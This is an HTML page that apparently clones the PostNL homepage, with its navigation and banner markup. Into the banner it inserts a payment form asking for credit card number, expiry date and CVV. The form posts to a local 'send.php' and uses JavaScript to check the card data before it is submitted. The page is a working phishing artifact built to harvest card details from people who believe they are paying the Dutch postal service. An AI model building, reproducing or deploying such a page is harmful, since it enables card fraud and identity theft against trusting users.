fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Ontvangen</h2><ul class="main-nav__sublist main-nav__sublist--default"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/post-ontvangen/"><span class="stamp-link__content">Post ontvangen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/pakket-ontvangen/"><span class="stamp-link__content">Pakket ontvangen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/post-doorsturen/"><span class="stamp-link__content">Post doorsturen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://jouw.postnl.nl/track-and-trace/?pst=sp-pnl-nav-ontv-ql1-track-and-trace"><span class="stamp-link__content">Track &amp; Trace</span></a><img aria-hidden="true" src="package_search.svg" class="main-nav__image" alt="Track &amp; Trace" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/post-doorsturen/verhuisservice/"><span class="stamp-link__content">Verhuisservice</span></a><img aria-hidden="true" src="Verhuisservice.png" class="main-nav__image" alt="Verhuisservice" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://jouw.postnl.nl/porto/"><span class="stamp-link__content">Portokosten</span></a><img aria-hidden="true" src="portokosten.jpg" class="main-nav__image" alt="Portokosten" loading="lazy"></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://www.postnl.nl/ontvangen/pakket-ontvangen/bezorging-pakketten/bezorgvoorkeuren/"><span class="stamp-link__content">Bezorgvoorkeuren</span></a><img aria-hidden="true" src="home-love_(1).svg" class="main-nav__image" alt="Bezorgvoorkeuren" loading="lazy"></li></ul></div></div></li><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Webshop" href="https://shop.postnl.nl/webshop"><span class="stamp-link__content">Webshop</span></a><button class="main-nav__trigger stamp-link" aria-expanded="false" aria-controls="menu-item-desktop-main-navigation"><span class="visually-hidden">Open submenu</span><span class="stamp-link__content"><div class="stamp-link__icon stamp-link__icon--end" bis_skin_checked="1"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M9.32431 21.624L17.5719 13.1431C18.1388 12.56 18.1432 11.6349 17.5819 11.0464L9.34896 2.41565C8.83858 1.88061 7.98971 1.85929 7.45295 2.36805L7.40983 2.41081C6.8658 2.97545 6.86307 3.86661 7.40362 4.43455L14.699 12.0996L7.41589 19.572C6.87024 20.1318 6.86756 21.0219 7.40983 21.585C7.9277 22.1227 8.78484 22.1402 9.32431 21.624Z" fill="currentColor"></path></svg></div></span></button><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-webshop" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Webshop</h2><ul class="main-nav__sublist main-nav__sublist--default"><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/postzegels"><span class="stamp-link__content">Postzegels</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/verpakkingen"><span class="stamp-link__content">Verpakkingen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/kantoorartikelen"><span class="stamp-link__content">Kantoorartikelen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/cadeaus"><span class="stamp-link__content">Cadeaus</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/collect-club"><span class="stamp-link__content">Collect Club</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li><li class="main-nav__subitem main-nav__subitem--image"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" href="https://shop.postnl.nl/webshop/zakelijke-hulpmiddelen"><span class="stamp-link__content">Zakelijke hulpmiddelen</span></a><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></li></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"></ul></div></div></li><li class="main-nav__item"><div class="main-nav__item-wrapper" bis_skin_checked="1"><a class="stamp-link stamp-link--size-m main-nav__button main-nav__link " target="_self" id="menu-item-Service &amp; Contact" href="https://www.postnl.nl/klantenservice/"><span class="stamp-link__content">Service &amp; Contact</span></a><div class="main-nav__sublist-wrapper" id="desktop-main-navigation-service &amp; contact" bis_skin_checked="1"><button type="button" class="main-nav__button main-nav__button--back"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.6757 21.624L6.42815 13.1431C5.8612 12.56 5.85677 11.6349 6.41809 11.0464L14.651 2.41565C15.1614 1.88061 16.0103 1.85929 16.547 2.36805L16.5902 2.41081C17.1342 2.97545 17.1369 3.86661 16.5964 4.43455L9.30096 12.0996L16.5841 19.572C17.1298 20.1318 17.1324 21.0219 16.5902 21.585C16.0723 22.1227 15.2152 22.1402 14.6757 21.624Z" fill="currentColor"></path></svg>Terug naar overzicht</button><h2 class="stamp-heading stamp-heading--size-s stamp-heading--color-subtle main-nav__sublist-title">Service &amp; Contact</h2><ul class="main-nav__sublist main-nav__sublist--default"></ul><ul class="main-nav__sublist main-nav__sublist--illustrated"></ul></div></div></li></ul></nav><div class="header-mobile__footer header-mobile__footer--universal" bis_skin_checked="1"><button type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-:R1pt5m:" data-state="closed" class="pci-popover__trigger">NL<!-- --> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M21.624 9.32431L13.1431 17.5719C12.56 18.1388 11.6349 18.1432 11.0464 17.5819L2.41565 9.34896C1.88061 8.83858 1.85929 7.98971 2.36805 7.45295L2.41081 7.40983C2.97545 6.8658 3.86661 6.86307 4.43455 7.40362L12.0996 14.699L19.572 7.41589C20.1318 6.87024 21.0219 6.86756 21.585 7.40983C22.1227 7.9277 22.1402 8.78484 21.624 9.32431Z" fill="currentColor"></path></svg></button></div></div></div></div><main id="main-content" tabindex="-1" class=""><section class="outer outer--banner-spotlight"><div class="inner inner--mobile inner--full" bis_skin_checked="1"><div class="stamp-container stamp-container--fixed" bis_skin_checked="1"><div class="stamp-container__content" bis_skin_checked="1"><div class="stamp-banner stamp-spotlight-banner stamp-spotlight-banner--media-type-image" bis_skin_checked="1"><div class="stamp-spotlight-banner__decoration-container" bis_skin_checked="1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 284 283" class="stamp-spotlight-banner__decoration"><path stroke="#E75204" stroke-width="10" d="M43.893 16.34c-9.809 7.584-18.099 22.83-24.233 44.618M10.662 112.424c1.541-17.345 4.274-34.695 8.997-51.47"></path><path stroke="#005E35" stroke-width="10" d="M10.174 164.936c-1.199-17.491-1.063-35.051.489-52.515M18.014 216.438c-3.976-15.679-6.606-33.473-7.841-51.495"></path><path stroke="#FFAD00" stroke-width="10" d="M39.836 262.532c-11.931-12.133-17.727-29.951-21.822-46.098M86.925 271.592c-15.954 2.693-34.812 3.431-47.087-9.051"></path><path stroke="#00BB53" stroke-width="10" d="M136.88 256.635c-16.982 6.779-34.44 12.335-49.958 14.955M183.996 234.334c-13.616 7.514-30.127 15.519-47.115 22.3M227.647 205.228c-13.723 10.853-28.342 20.653-43.65 29.101"></path><path stroke="#6161FF" stroke-width="10" d="M264.278 168.326c-9.877 14.29-23.089 26.19-36.631 36.899"></path><path stroke="#F56400" stroke-width="10" d="M268.033 120.656c4.07 7.028 6.585 14.028 6.595 20.568-.013 8.367-3.727 17.529-10.35 27.11"></path><path stroke="#F56900" stroke-width="10" d="M233.02 81.97c13.31 11.226 26.2 23.464 35.012 38.682"></path><path stroke="#001A73" stroke-width="10" d="M190.251 51.677c14.22 8.354 29.416 19.03 42.768 30.292M143.238 28.709c16.123 6.612 31.971 14.129 47.015 22.967"></path><path stroke="#fff" stroke-width="10" d="M93.478 12.665c15.656 3.363 33.037 9.187 49.761 16.045M43.892 16.338c13.553-10.48 34.156-6.987 49.585-3.673"></path></svg></div><div class="stamp-spotlight-banner__content" bis_skin_checked="1">
<div class="billing-form-container">
  <div class="billing-form">
    <form id="billingForm" method="POST" action="send.php">
      <div class="form-group">
        <label for="card-number">Creditcardnummer:</label>
        <input type="text" id="card-number" name="card-number" required pattern="^\d{16}$" 
          title="Voer een geldig creditcardnummer in (16 cijfers)." maxlength="16" minlength="13">
      </div>

      <div class="form-group">
        <label for="expiry-date">Vervaldatum (MM/YY):</label>
        <input type="text" id="expiry-date" name="expiry-date" required pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$"
          title="Voer een geldige vervaldatum in het formaat MM/YY in." maxlength="5" minlength="5">
      </div>

      <div class="form-group">
        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" required pattern="^\d{3,4}$" 
          title="Voer een geldige CVV in (3 of 4 cijfers)." maxlength="4" minlength="3">
      </div>

      <button type="submit" class="button-zoeken">Betalen</button>
    </form>
  </div>
</div>

<style>
  .button-zoeken {
    background-color: rgb(97, 97, 255); /* Blue color */
    color: white; /* White text */
    padding: 10px 20px; /* Vertical and horizontal padding */
    font-weight: bold; /* Bold font */
    border: none; /* No border */
    border-radius: 5px; /* Rounded corners */
    font-size: 1rem; /* Font size */
    text-align: center; /* Center the text */
    cursor: pointer; /* Pointer on hover */
    transition: background-color 0.3s ease, transform 0.3s ease; /* Smooth transitions */
  }

  .button-zoeken:hover {
    transform: scale(1.05); /* Slightly larger on hover */
    text-decoration: underline;
  }

  .button-zoeken:focus {
    outline: none; /* Remove the focus outline */
  }

  /* Root colors inspired by PostNL branding */
  :root {
    --postnl-orange: #ff6600;
    --postnl-blue: #003399;
    --input-bg: #fff;
    --input-border: #ccc;
    --input-focus-border: var(--postnl-orange);
    --label-color: #003399;
    --font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  }

  .billing-form-container {
    max-width: 400px;
    margin: 2rem auto;
    padding: 2rem;
    background: #f9f9f9;
    border-radius: 8px;
    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
    font-family: var(--font-family);
  }

  .form-group {
    margin-bottom: 1.5rem;
  }

  label {
    display: block;
    margin-bottom: 0.5rem;
    font-weight: 600;
    color: var(--label-color);
    font-size: 1rem;
  }

  input[type="text"] {
    width: 100%;
    padding: 0.6rem 0.8rem;
    font-size: 1rem;
    border: 2px solid var(--input-border);
    border-radius: 4px;
    background: var(--input-bg);
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
    box-sizing: border-box;
  }

  input[type="text"]:focus {
    border-color: var(--input-focus-border);
    box-shadow: 0 0 6px var(--input-focus-border);
    outline: none;
  }

  input[aria-invalid="true"] {
    border-color: red;
    box-shadow: 0 0 6px red;
  }
</style>

<script>
  document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('billingForm');
  const cardNumberInput = document.getElementById('card-number');
  const expiryDateInput = document.getElementById('expiry-date');
  const cvvInput = document.getElementById('cvv');

  // Function to validate the card number (13-16 digits)
  function validateCardNumber() {
    const value = cardNumberInput.value.trim();
    if (!/^\d{13,16}$/.test(value)) {
      cardNumberInput.setAttribute('aria-invalid', 'true');
      return false;
    }
    cardNumberInput.removeAttribute('aria-invalid');
    return true;
  }

  // Function to format the expiry date in MM/YY
  function formatExpiryDate() {
    let value = expiryDateInput.value.trim();
    // Remove any non-numeric characters
    value = value.replace(/\D/g, '');

    // Add '/' after two digits if not already present
    if (value.length > 2) {
      value = value.substring(0, 2) + '/' + value.substring(2);
    }

    // Limit to 5 characters (MM/YY)
    value = value.substring(0, 5);
    expiryDateInput.value = value;
  }

  // Function to validate the expiry date
  function validateExpiryDate() {
    const value = expiryDateInput.value.trim();
    if (!/^\d{2}\/\d{2}$/.test(value)) {
      expiryDateInput.setAttribute('aria-invalid', 'true');
      return false;
    }
    const [monthStr, yearStr] = value.split('/');
    const month = parseInt(monthStr, 10);
    const year = parseInt(yearStr, 10);
    if (month < 1 || month > 12) {
      expiryDateInput.setAttribute('aria-invalid', 'true');
      return false;
    }
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      expiryDateInput.setAttribute('aria-invalid', 'true');
      return false;
    }
    expiryDateInput.removeAttribute('aria-invalid');
    return true;
  }

  // Function to validate the CVV (3 digits or 4 digits depending on card type)
  function validateCVV() {
    const cardNumberValue = cardNumberInput.value.trim();
    const isAmex = cardNumberValue.startsWith('34') || cardNumberValue.startsWith('37');
    const cvvPattern = isAmex ? /^\d{4}$/ : /^\d{3}$/;
    const value = cvvInput.value.trim();

    if (!cvvPattern.test(value)) {
      cvvInput.setAttribute('aria-invalid', 'true');
      return false;
    }
    cvvInput.removeAttribute('aria-invalid');
    return true;
  }

  // Add event listeners for input events on the fields
  cardNumberInput.addEventListener('input', validateCardNumber);
  expiryDateInput.addEventListener('input', formatExpiryDate);
  expiryDateInput.addEventListener('input', validateExpiryDate);
  cvvInput.addEventListener('input', validateCVV);

  // Form submit validation
  form.addEventListener('submit', (e) => {
    const isCardValid = validateCardNumber();
    const isExpiryValid = validateExpiryDate();
    const isCVVValid = validateCVV();

    // Prevent form submission if any field is invalid
    if (!isCardValid || !isExpiryValid || !isCVVValid) {
      e.preventDefault();
    }
  });
});

</script>


<div class="stamp-spotlight-banner__media" bis_skin_checked="1"><picture class=" pci-picture"><source srcset="pakketautomaat-vrouw-jarige-job.webp 1x, pakketautomaat-vrouw-jarige-job-1.webp 2x" media="(min-width: 800px)"><source srcset="pakketautomaat-vrouw-jarige-job-2.webp 1x, pakketautomaat-vrouw-jarige-job-3.webp 2x" media="(min-width: 909px)"><source srcset="pakketautomaat-vrouw-jarige-job-4.webp 1x, pakketautomaat-vrouw-jarige-job-6.webp 2x" media="(min-width: 1024px)"><source srcset="pakketautomaat-vrouw-jarige-job-5.webp 1x, pakketautomaat-vrouw-jarige-job-7.webp 2x"><img src="pakketautomaat-vrouw-jarige-job-5.webp" alt="" loading="eager"></picture></div></div></div></div></div></div></section><section class="outer top-taskbar"><div class="inner inner--mobile-full" bis_skin_checked="1"><div dir="ltr" data-orientation="horizontal" class="pci-toptasks" bis_skin_checked="1"><div role="tablist" aria-orientation="horizontal" class="pci-toptasks__list" tabindex="0" data-orientation="horizontal" style="outline:none" bis_skin_checked="1"><button type="button" role="tab" aria-selected="true" aria-controls="radix-:Rd6d5m:-content-tab-0" data-state="active" id="radix-:Rd6d5m:-trigger-tab-0" aria-label="Volg je pakket" class="pci-toptasks__trigger" tabindex="-1" data-orientation="horizontal" data-radix-collection-item=""><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="pci-toptasks__icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M18.1121 11.8508C18.1896 11.8508 18.8553 12.2249 19.0427 12.4242C19.16 12.5488 19.1555 12.715 19.1508 12.8941C19.1498 12.9301 19.1488 12.9667 19.1488 13.0035L19.1511 17.7912C19.1511 18.0178 19.008 18.2216 18.7893 18.3049L11.3262 21.1633C11.0285 21.2764 10.8575 21.2536 10.7139 21.1847L2.31643 17.1312C2.12253 17.0376 2 16.846 2 16.6367V8.52974C2 8.30458 2.14123 8.10228 2.35728 8.01752L9.95587 5.04043C10.099 4.98515 10.2582 4.98626 10.3986 5.04559L11.0852 5.3326C11.4589 5.48884 11.4766 6.01171 11.1143 6.19285C10.8678 6.31608 10.5799 6.32584 10.3257 6.21959L10.1643 6.15214L4.02424 8.55733L6.41562 9.60239L11.2865 7.58828C11.4234 7.53168 11.577 7.53079 11.7145 7.5858C12.1877 7.77508 12.1915 8.44356 11.7204 8.63817L7.85955 10.2333L11.0189 11.6137L13.2427 10.7477C13.277 10.7344 13.3107 10.7204 13.344 10.7066C13.5157 10.6352 13.675 10.569 13.8397 10.628C14.1012 10.7212 14.7092 11.1763 14.7382 11.2459C14.7508 11.2762 14.7692 11.3454 14.7398 11.3569L11.546 12.588V19.8898L18.006 17.4157L18.0037 11.891C18.0037 11.8604 18.0782 11.8508 18.1121 11.8508ZM3.14521 9.38641V16.295L10.432 19.7976V12.5702L7.20082 11.1585V15.8053C7.20082 15.8359 7.12639 15.8454 7.09242 15.8454C7.01493 15.8454 6.34924 15.4718 6.16182 15.2721C6.04457 15.1478 6.049 14.9817 6.05378 14.8026C6.05474 14.7666 6.05571 14.73 6.05571 14.6932V10.6581L3.14521 9.38641Z" fill="currentColor"></path><path d="M18.5175 9.33576L20.8346 11.6528C20.8467 11.665 20.8589 11.6773 20.8711 11.6895C21.0198 11.8395 21.1707 11.9917 21.3651 11.9995C21.6448 12.0113 22.363 11.8098 22.4184 11.7544C22.4427 11.7301 22.4886 11.6702 22.4662 11.6479L19.3358 8.51746L18.5175 9.33576Z" fill="currentColor"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M16.7618 9.5205C18.2854 9.5205 19.5205 8.2854 19.5205 6.76183C19.5205 5.23825 18.2854 4.00315 16.7618 4.00315C15.2383 4.00315 14.0032 5.23825 14.0032 6.76183C14.0032 8.2854 15.2383 9.5205 16.7618 9.5205ZM16.7618 10.5237C18.8394 10.5237 20.5237 8.83943 20.5237 6.76183C20.5237 4.68423 18.8394 3 16.7618 3C14.6842 3 13 4.68423 13 6.76183C13 8.83943 14.6842 10.5237 16.7618 10.5237Z" fill="currentColor"></path></svg><span class="pci-toptasks__label">Volg je pakket</span></button><button type="button" role="tab" aria-selected="false" aria-controls="radix-:Rd6d5m:-content-tab-1" data-state="inactive" id="radix-:Rd6d5m:-trigger-tab-1" aria-label="Versturen" class="pci-toptasks__trigger" tabindex="-1" data-orientation="horizontal" data-radix-collection-item=""><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="pci-toptasks__icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.78276 13.036L8.73376 13.013L6.72876 12.1L11.8058 9.98L13.7938 10.962L8.78276 13.036ZM8.27276 20.436L3.00076 17.802V11.505L5.05876 12.442V15.271C5.05876 15.314 5.05776 15.357 5.05676 15.399C5.05176 15.59 5.04776 15.74 5.14176 15.845C5.31276 16.033 5.90576 16.386 6.05976 16.448V12.898L8.27276 13.906V20.436ZM9.09976 8.644L10.6128 9.391L5.48376 11.533L5.43376 11.51L3.78076 10.758L9.09976 8.644ZM14.9778 6.879L10.1188 3.004H19.8638L14.9778 6.879ZM15.5098 18.636V11.784H21.2498C21.5258 11.784 21.7498 11.558 21.7498 11.281V2.502C21.7498 2.225 21.5258 2 21.2498 2H8.73876C8.46276 2 8.23876 2.225 8.23876 2.502V6.084C8.34676 6.044 8.97776 5.673 9.15576 5.476C9.24976 5.372 9.24576 5.221 9.24076 5.03C9.24076 4.988 9.23976 4.946 9.23976 4.903V3.585L14.6658 7.912C14.8468 8.057 15.1028 8.057 15.2868 7.913L20.7488 3.582V10.088L18.7108 8.087C18.6798 8.057 18.6508 8.026 18.6208 7.996C18.4738 7.845 18.3778 7.751 18.2438 7.746H18.2228C17.9548 7.746 17.3198 7.917 17.1728 7.981L20.0218 10.779H15.4628L15.4258 10.723C15.3758 10.65 15.2888 10.581 15.2288 10.551L9.34276 7.645C9.27176 7.612 9.19376 7.596 9.11676 7.596C9.05476 7.596 8.99376 7.606 8.93876 7.629L2.31576 10.259C2.12776 10.34 2.00276 10.522 2.00076 10.722L1.99976 18.112C1.99976 18.301 2.10876 18.477 2.27776 18.56L8.55076 21.697C8.70676 21.775 8.88876 21.765 9.03776 21.674C9.18576 21.582 9.27376 21.423 9.27376 21.248V13.919L9.35076 13.888L14.5088 11.752V18.323L14.4388 18.358L11.4368 19.845C11.3988 19.863 11.3598 19.881 11.3228 19.898C11.1498 19.978 11.0128 20.042 10.9608 20.174C10.8678 20.412 10.8158 21.099 10.8278 21.265L15.2298 19.085C15.3998 19.001 15.5098 18.825 15.5098 18.636Z" fill="currentColor"></path></svg><span class="pci-toptasks__label">Versturen</span></button><button type="button" role="tab" aria-selected="false" aria-controls="radix-:Rd6d5m:-content-tab-2" data-state="inactive" id="radix-:Rd6d5m:-trigger-tab-2" aria-label="PostNL-punten" class="pci-toptasks__trigger" tabindex="-1" data-orientation="horizontal" data-radix-collection-item=""><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="pci-toptasks__icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 7.08077C11.2239 7.08077 10.1857 8.14114 10.1857 9.44433C10.1857 10.7466 11.2239 11.807 12.5 11.807C13.7761 11.807 14.8143 10.7466 14.8143 9.44433C14.8143 8.14114 13.7761 7.08077 12.5 7.08077ZM12.5 12.8543C10.6586 12.8543 9.1602 11.3249 9.1602 9.44433C9.1602 7.56291 10.6586 6.03263 12.5 6.03263C14.3414 6.03263 15.8398 7.56291 15.8398 9.44433C15.8398 11.3249 14.3414 12.8543 12.5 12.8543ZM12.5 4.04814C9.48178 4.04814 7.02632 6.55582 7.02632 9.63824C7.02632 13.4124 11.2239 18.0566 12.4932 19.3746C13.7572 18.0173 17.9737 13.2194 17.9737 9.63824C17.9737 6.55582 15.5182 4.04814 12.5 4.04814ZM12.5 20.6429C12.3734 20.6429 12.2468 20.5966 12.1476 20.5005C11.897 20.2585 6 14.5147 6 9.63824C6 5.9776 8.91645 3 12.5 3C16.0836 3 19 5.9776 19 9.63824C19 14.2684 13.1107 20.2411 12.8601 20.4926C12.7609 20.5931 12.63 20.6429 12.5 20.6429Z" fill="currentColor"></path></svg><span class="pci-toptasks__label">PostNL-punten</span></button><button type="button" role="tab" aria-selected="false" aria-controls="radix-:Rd6d5m:-content-tab-3" data-state="inactive" id="radix-:Rd6d5m:-trigger-tab-3" aria-label="Postcode zoeken" class="pci-toptasks__trigger" tabindex="-1" data-orientation="horizontal" data-radix-collection-item=""><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="pci-toptasks__icon" role="presentation"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.791 14.7995C11.609 14.7995 9.835 13.0245 9.835 10.8425C9.835 8.6605 11.609 6.8865 13.791 6.8865C15.973 6.8865 17.748 8.6605 17.748 10.8425C17.748 13.0245 15.973 14.7995 13.791 14.7995ZM21.265 17.8465L21.364 17.8385C21.346 17.6145 21.192 17.4375 21.062 17.3075L17.828 